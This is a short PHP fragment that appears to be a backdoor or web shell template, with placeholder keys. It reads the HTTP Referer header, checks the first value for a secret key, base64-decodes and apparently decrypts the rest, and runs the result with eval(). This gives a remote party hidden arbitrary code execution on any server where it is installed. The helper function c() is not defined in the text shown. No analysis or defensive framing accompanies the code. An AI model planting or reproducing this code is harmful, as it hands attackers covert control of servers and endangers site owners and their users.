parse_str($_SERVER['HTTP_REFERER'],$a); 
if(reset($a)=='%%%START_KEY%%%') { 
echo '<%%%END_KEY%%%>';
eval(c(base64_decode(join(array_slice($a,1))), '%%%END_KEY%%%'));
echo '</%%%END_KEY%%%>';
}